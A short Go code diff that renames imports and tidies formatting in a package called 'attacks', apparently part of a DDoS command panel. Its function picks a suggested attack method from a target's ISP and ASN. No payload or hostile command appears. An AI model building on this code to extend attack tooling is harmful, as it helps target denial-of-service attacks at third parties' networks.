@@ -1,16 +1,15 @@
 package attacks
 
 import (
-	"Nosviak2/core/configs/models"
-	"Nosviak2/core/sources/layouts/json"
-	"Nosviak2/core/sources/tools"
+	"Morphine/core/configs/models"
+	"Morphine/core/sources/layouts/json"
+	"Morphine/core/sources/tools"
 	"strconv"
 	"strings"
 )
 
-//MatchSuggestion will suggest the closest model inside the array
+// MatchSuggestion will suggest the closest model inside the array
 func MatchSuggestion(isp string, asn string, method string) (string, *models.SuggestionModel) {
-
 
 	//ranges through all possible entrys within the system
 	for entry, information := range json.Suggestions.Methods {
@@ -36,7 +35,7 @@ func MatchSuggestion(isp string, asn string, method string) (string, *models.Sug
 			return entry, information
 		}
 
-	} 
+	}
 
 	return "", nil
 }
@@ -44,5 +43,6 @@ func MatchSuggestion(isp string, asn string, method string) (string, *models.Sug
 func Quick(i []int, src []string) []string {
 	for _, c := range i {
 		src = append(src, string(c))
-	}; return src
+	}
+	return src
 }
